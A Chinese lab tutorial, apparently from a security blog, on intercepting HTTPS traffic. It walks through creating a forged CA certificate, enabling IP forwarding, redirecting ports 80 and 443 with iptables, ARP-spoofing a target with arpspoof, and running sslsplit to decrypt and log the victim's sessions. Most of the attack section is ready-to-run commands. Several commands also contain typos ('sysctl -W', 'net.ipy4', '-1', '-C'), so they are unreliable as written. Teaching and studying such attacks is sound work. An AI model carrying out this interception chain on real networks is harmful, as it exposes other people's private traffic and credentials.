## 一、实验基础

### 1、HTTPS概述

HTTPS (全称: Hyper Text Transfer Protocol over SecureSocketLayer)，
是以安全为目标的HTTP通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性。

默认端口：443

SSLsplit特点：对客户端伪装成服务器，对服务器伪装成客户端需要提前准备证书(可以用openss|生成)

### 2、HTTPS加密传输过程

客户端发起https请求——建立https握手——协商加密算法——客户端获取公钥证书(证书、公钥)——客户端验证公钥证书——交换会话密钥——加密信息传输

数据(1)一对称加密算法加密——hash加密后的数据 (2)——公钥加密后的数据(3)

将1、2、3都发给服务器

### 3、HTTPS攻击流程图

![1603879806_5f99437e5136f54bdf752.png!small?1603879804805](https://image.3001.net/images/20201028/1603879806_5f99437e5136f54bdf752.png!small?1603879804805)

## 二、实验步骤

### 1、生成私钥

openssl genrsa -out ca.key 2048

###
![1603879453_5f99421dcafe56e446ffe.png!small?1603879452707](https://image.3001.net/images/20201028/1603879453_5f99421dcafe56e446ffe.png!small?1603879452707)  
2、利用私钥签名生成证书

openssl req -new -x509 -days 365 -key ca.key -out ca.crt

![1603879462_5f99422624f05abfd8c28.png!small](https://image.3001.net/images/20201028/1603879462_5f99422624f05abfd8c28.png!small)

### 3、攻击机的配置

（1）开启路由  
sysctl -W net.ipy4.ip_ forward=1  
或直接修改/proc/sys/net/ipv4/ip. forward文件设置为1  
  
（2）开启端口转发  
查看当前nat表规则 iptables -t nat -L  
因为不相干的nat表规则会对实验有影响，所以清空nat表规则 iptables -t nat -F  
确定80和443端口没有被占用，如果被占用就杀掉

> netstat -pantu | grep :80  
> netstat -pantu | grep :443

目标80端口重定向到8080端口

> iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
>
> iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443

![1603880437_5f9945f57cc820aae59f8.png!small?1603880435996](https://image.3001.net/images/20201028/1603880437_5f9945f57cc820aae59f8.png!small?1603880435996)

![1603880426_5f9945ea0f5153ba9dd3b.png!small?1603880424646](https://image.3001.net/images/20201028/1603880426_5f9945ea0f5153ba9dd3b.png!small?1603880424646)

### 4、被攻击者被攻击前的网关mac地址

![1603880537_5f994659cef93cdf7af74.png!small?1603880536542](https://image.3001.net/images/20201028/1603880537_5f994659cef93cdf7af74.png!small?1603880536542)

### 5、攻击者IP地址

![1603880613_5f9946a583cdca5b0456c.png!small?1603880612101](https://image.3001.net/images/20201028/1603880613_5f9946a583cdca5b0456c.png!small?1603880612101)

### 6、进行欺骗

欺骗指令arpspoof -i eth0 -t 192.168.10.172 -r 192.168.10.254

注：

因为是动态的，所以欺骗要持续进行

如果出现arpspoof未找到命令，则使用apt install dsniff命令安装

![1603880671_5f9946dfba9139e0eab68.png!small?1603880670519](https://image.3001.net/images/20201028/1603880671_5f9946dfba9139e0eab68.png!small?1603880670519)

### 7、欺骗成功

查看目标主机的arp表，发现 已经欺骗成功

![1603880784_5f9947506e328a3e02887.png!small?1603880783102](https://image.3001.net/images/20201028/1603880784_5f9947506e328a3e02887.png!small?1603880783102)

8、启动SSLsplit

sslsplit -D -l connect.log -j /home/melon -S melon/logdir -k ca.key -c ca.crt
ssl 0.0.0.0 8443 tcp 0.0.0.0 8080

第一个路径是存放ca密钥和证书的目录，第二个路径是存放目标主机的具体数据内容

> -D debug详细信息  
> -1记录连接信息到文件  
> -j指定SSLspit的根目录  
> -S存放客户端请求的具体数据内容  
> -k私钥  
> -C证书

PS：本文仅用于技术讨论和研究，严禁用于任何非法用途，违者后果自负，与平台及作者无关。

